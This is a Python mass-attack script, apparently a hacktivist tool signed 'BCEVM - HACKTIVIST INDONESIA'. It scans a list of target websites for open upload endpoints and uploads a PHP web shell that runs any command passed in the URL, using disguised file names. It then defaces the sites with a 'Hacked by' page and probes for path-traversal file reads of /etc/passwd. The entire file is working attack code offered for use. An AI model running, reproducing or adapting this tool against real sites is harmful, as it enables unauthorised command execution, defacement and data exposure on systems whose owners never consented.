#!/usr/bin/env python3
import os
import re
import time
import random
import requests
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed

# ====== Configuration ======
THREADS = 10
TIMEOUT = 10
MAX_RETRIES = 2

TARGETS_FILE = "targets.txt"
SUCCESS_FILE = "success.txt"
DEFACE_FILE = "deface.html"
DEFAULT_DEFACE = "<h1>Hacked by BCEVM - HACKTIVIST INDONESIA</h1>"
SHELL_CODE = "<?php echo 'Hacked by BCEVM - HACKTIVIST INDONESIA'; system($_GET['cmd']); ?>"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64)"
]

UPLOAD_PATHS = [
    'upload.php', 'admin/upload.php', 'filemanager/upload.php',
    'assets/upload.php', 'inc/upload.php'
]

CMS_PATTERNS = {
    'wordpress': ['/wp-admin/', '/wp-content/plugins/', '/xmlrpc.php'],
    'joomla': ['/administrator/', '/index.php?option=com_'],
    'drupal': ['/user/login', '/admin/']
}

LFI_TESTS = [
    '../../../../../../../../etc/passwd',
    '....//....//....//....//....//etc/passwd',
    '%2e%2e%2f%2e%2e%2fetc%2fpasswd'
]

# ====== Utility Functions ======
def get_random_agent():
    return random.choice(USER_AGENTS)

def is_valid_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except:
        return False

def read_targets():
    if os.path.exists(TARGETS_FILE):
        with open(TARGETS_FILE, 'r') as f:
            return [line.strip() for line in f if is_valid_url(line.strip())]
    return []

def write_success(result):
    with open(SUCCESS_FILE, 'a') as f:
        f.write(result + "\n")

def get_deface_content():
    if os.path.exists(DEFACE_FILE):
        with open(DEFACE_FILE, 'r') as f:
            return f.read()
    return DEFAULT_DEFACE

# ====== Vulnerability Checkers ======
def check_upload_url(base_url):
    for path in UPLOAD_PATHS:
        full_url = urljoin(base_url, path)
        try:
            r = requests.get(full_url, headers={'User-Agent': get_random_agent()}, timeout=TIMEOUT)
            if r.status_code == 200 and ('upload' in r.text.lower() or 'file' in r.text.lower()):
                return full_url
        except:
            continue
    return None

def try_file_upload(upload_url):
    filenames = ["shell.php", "shell.php.jpg", "shell.phtml"]
    for name in filenames:
        files = {'file': (name, SHELL_CODE, 'application/x-php')}
        try:
            r = requests.post(upload_url, files=files, timeout=TIMEOUT)
            if r.status_code in [200, 201]:
                possible_path = urljoin(upload_url, f"../uploads/{name}")
                check = requests.get(possible_path, timeout=TIMEOUT)
                if check.status_code == 200:
                    return possible_path
        except:
            continue
    return None

def try_deface(upload_url):
    content = get_deface_content()
    files = {'file': ('default.html', content, 'text/html')}
    try:
        r = requests.post(upload_url, files=files, timeout=TIMEOUT)
        return r.status_code in [200, 201]
    except:
        return False

def check_lfi(url):
    for test in LFI_TESTS:
        test_url = f"{url}{'' if '?' in url else '?'}file={test}"
        try:
            r = requests.get(test_url, timeout=TIMEOUT)
            if 'root:x:0:' in r.text:
                return True
        except:
            continue
    return False

def detect_cms(url):
    try:
        r = requests.get(url, headers={'User-Agent': get_random_agent()}, timeout=TIMEOUT)
        html = r.text.lower()
        for cms, paths in CMS_PATTERNS.items():
            if cms in html or any(path in html for path in paths):
                return cms
    except:
        return None

# ====== Main Scanner ======
def scan_target(url):
    print(f"[*] Scanning {url}")
    cms = detect_cms(url)

    upload_url = check_upload_url(url)
    if upload_url:
        shell_path = try_file_upload(upload_url)
        if shell_path:
            print(f"[+] Shell uploaded at: {shell_path}")
            write_success(f"Shell: {shell_path}")
            if try_deface(upload_url):
                print(f"[+] Defaced default.html at: {upload_url}")
                write_success(f"Defaced: {upload_url}/default.html")
            return

    if check_lfi(url):
        print(f"[+] LFI found at: {url}")
        write_success(f"LFI: {url}")
        return

    print(f"[-] No vuln found at: {url}")

# ====== Runner ======
def main():
    targets = read_targets()
    if not targets:
        print("[!] No valid targets found in targets.txt")
        return

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {executor.submit(scan_target, url): url for url in targets}
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"[!] Error: {e}")

    print("[*] Scan finished.")

if __name__ == "__main__":
    main()
